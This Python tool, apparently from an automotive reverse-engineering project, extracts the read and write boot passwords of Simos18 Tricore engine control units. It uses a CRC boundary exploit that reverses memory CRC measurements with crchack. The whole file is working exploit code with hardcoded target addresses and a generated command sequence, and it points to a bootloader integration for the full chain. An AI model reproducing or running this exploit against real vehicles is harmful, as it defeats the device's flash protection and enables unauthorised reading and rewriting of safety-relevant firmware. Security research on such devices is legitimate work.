#!/usr/bin/env python3
"""
crc_password_extractor.py - Automated boot password extraction via CRC
"""
import subprocess
import struct
from dataclasses import dataclass
from typing import List, Tuple
import binascii

@dataclass
class CRCResult:
    address_start: int
    address_end: int
    crc_value: int
    iteration: int

class BootPasswordExtractor:
    """Extract Tricore boot passwords using CRC boundary exploit"""
    
    # Simos18 specific addresses
    BOOT_PASSWORD_ADDR = 0x8001420C
    OTP_CRYPTO_START = 0x8001421C
    DEVICE_ID_ADDR = 0x80014200
    
    CRC32_POLY = 0x4C11DB7
    CHUNK_SIZE = 0x100  # 256 bytes per CRC iteration
    
    def __init__(self, crchack_path='./crchack'):
        self.crchack_path = crchack_path
        self.crc_results = []
    
    def calculate_crc32(self, data: bytes, initial_crc=0x00000000) -> int:
        """Calculate CRC32 for data"""
        cmd = [
            self.crchack_path,
            '-x', f'{initial_crc:08x}',
            '-i', '00000000',
            '-w', '32',
            '-p', f'0x{self.CRC32_POLY:x}',
            '-'
        ]
        
        result = subprocess.run(
            cmd,
            input=data,
            capture_output=True
        )
        
        return int(result.stdout.strip(), 16)
    
    def reverse_crc_chunk(self, known_following_data: bytes, 
                         target_crc: int, chunk_size: int = 4) -> bytes:
        """
        Use crchack to reverse CRC and find unknown data
        
        Args:
            known_following_data: Data that comes after unknown chunk
            target_crc: CRC value we want to achieve
            chunk_size: Size of unknown data to recover
        """
        # Write known data to temp file
        import tempfile
        with tempfile.NamedTemporaryFile(delete=False, suffix='.bin') as f:
            temp_file = f.name
            f.write(known_following_data)
        
        cmd = [
            self.crchack_path,
            '-x', '00000000',
            '-i', '00000000',
            '-w', '32',
            '-p', f'0x{self.CRC32_POLY:x}',
            '-b', f':{chunk_size}',  # Bruteforce first N bytes
            temp_file,
            f'{target_crc:08x}'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        
        if result.returncode == 0:
            # Read the output file
            with open(temp_file + '.out', 'rb') as f:
                recovered_data = f.read(chunk_size)
            return recovered_data
        
        return None
    
    def extract_passwords_from_crcs(self, crc_results: List[CRCResult], 
                                   known_trailing_data: bytes) -> Tuple[bytes, bytes]:
        """
        Extract both boot passwords from CRC measurements
        
        Process:
        1. Work backwards from known data using CRC values
        2. Each CRC gives us 4 bytes of password data
        3. Repeat sliding window to recover full passwords
        """
        print("Extracting passwords from CRC measurements...")
        print(f"Number of CRC results: {len(crc_results)}")
        
        # Sort CRC results by address (highest to lowest)
        sorted_crcs = sorted(crc_results, key=lambda x: x.address_start, reverse=True)
        
        recovered_data = bytearray()
        current_known_data = known_trailing_data
        
        for i, crc_result in enumerate(sorted_crcs):
            print(f"\nProcessing CRC #{i+1}")
            print(f"  Address range: 0x{crc_result.address_start:08X} - "
                  f"0x{crc_result.address_end:08X}")
            print(f"  CRC value: 0x{crc_result.crc_value:08X}")
            
            # Recover 4 bytes using crchack
            recovered_chunk = self.reverse_crc_chunk(
                current_known_data,
                crc_result.crc_value,
                chunk_size=4
            )
            
            if recovered_chunk:
                recovered_data = recovered_chunk + recovered_data
                current_known_data = recovered_chunk + current_known_data
                print(f"  Recovered: {recovered_chunk.hex()}")
            else:
                print(f"  Failed to recover chunk!")
        
        # Passwords are first 8 bytes (2x 32-bit words)
        if len(recovered_data) >= 8:
            pwd1 = recovered_data[0:4]
            pwd2 = recovered_data[4:8]
            
            print("\n" + "=" * 60)
            print("BOOT PASSWORDS RECOVERED!")
            print("=" * 60)
            print(f"Password 1 (READ):  {pwd1.hex()}")
            print(f"Password 2 (WRITE): {pwd2.hex()}")
            print("=" * 60)
            
            return pwd1, pwd2
        
        return None, None
    
    def generate_crc_exploit_commands(self, start_addr: int, 
                                     num_iterations: int = 4) -> List[dict]:
        """
        Generate sequence of CRC commands to extract passwords
        
        Returns list of command parameters for each iteration
        """
        commands = []
        
        for i in range(num_iterations):
            offset = i * 4  # Slide back 4 bytes each time
            addr = start_addr - offset
            
            commands.append({
                'iteration': i,
                'crc_start_addr': addr,
                'crc_end_addr': addr + self.CHUNK_SIZE,
                'description': f'Extract 4 bytes at 0x{addr:08X}'
            })
        
        return commands


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Extract Tricore boot passwords via CRC exploit'
    )
    parser.add_argument('--crchack', default='./crchack',
                       help='Path to crchack binary')
    parser.add_argument('--simulate', action='store_true',
                       help='Simulate with test data')
    
    args = parser.parse_args()
    
    extractor = BootPasswordExtractor(args.crchack)
    
    if args.simulate:
        # Simulation mode with test data
        print("Running in simulation mode...")
        
        # Generate test CRC commands
        commands = extractor.generate_crc_exploit_commands(
            extractor.BOOT_PASSWORD_ADDR + 0x10,
            num_iterations=4
        )
        
        print("\nCRC Exploit Command Sequence:")
        print("-" * 60)
        for cmd in commands:
            print(f"Iteration {cmd['iteration']}: {cmd['description']}")
            print(f"  CRC Range: 0x{cmd['crc_start_addr']:08X} - "
                  f"0x{cmd['crc_end_addr']:08X}")
        print("-" * 60)
        
        # Would integrate with bootloader.py here
        print("\nTo use: integrate these commands with TC1791_CAN_BSL/bootloader.py")
        print("The bootloader will execute CRC, reset ECU, and capture CRC state from RAM")
    else:
        print("This tool requires integration with bootloader.py")
        print("See README for full exploitation chain")


if __name__ == '__main__':
    main()
